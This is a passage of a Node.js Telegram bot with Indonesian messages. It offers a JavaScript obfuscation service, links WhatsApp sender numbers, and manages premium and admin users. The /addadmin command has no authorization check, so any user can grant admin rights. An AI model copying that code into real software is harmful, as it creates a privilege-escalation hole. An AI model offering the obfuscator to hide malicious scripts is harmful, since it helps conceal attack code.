        await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

        // Cek apakah file valid sebelum dienkripsi
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");

        // Proses enkripsi menggunakan Vincent Chaos Core
        const obfuscated = await JsConfuser.obfuscate(fileContent, getVexxuzzZObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;

        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        // Cek apakah hasil enkripsi valid
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");

        await fs.promises.writeFile(encryptedPath, obfuscatedCode);

        // Kirim file hasil enkripsi
        await bot.sendDocument(chatId, encryptedPath, {
            caption: "✅ *File terenkripsi (Vexxuzzz Chaos Core) siap!*\n_©INAZAMI INVICTUS",
            parse_mode: "Markdown"
        });

        await updateProgress(bot, chatId, progressMessage, 100, "VexxuzzZ Chaos Core Selesai");

        // Hapus file setelah dikirim
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    } catch (error) {
        await bot.sendMessage(chatId, `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });

        // Hapus file jika ada error
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    }
});

//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem You Id 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem You Id 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem You Id 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "⛧ ＬＩＳＴ ＰＲＥＭＩＵＭ ⛧\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin You Id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin You Id.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem You Id");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin You Id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin You Id.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});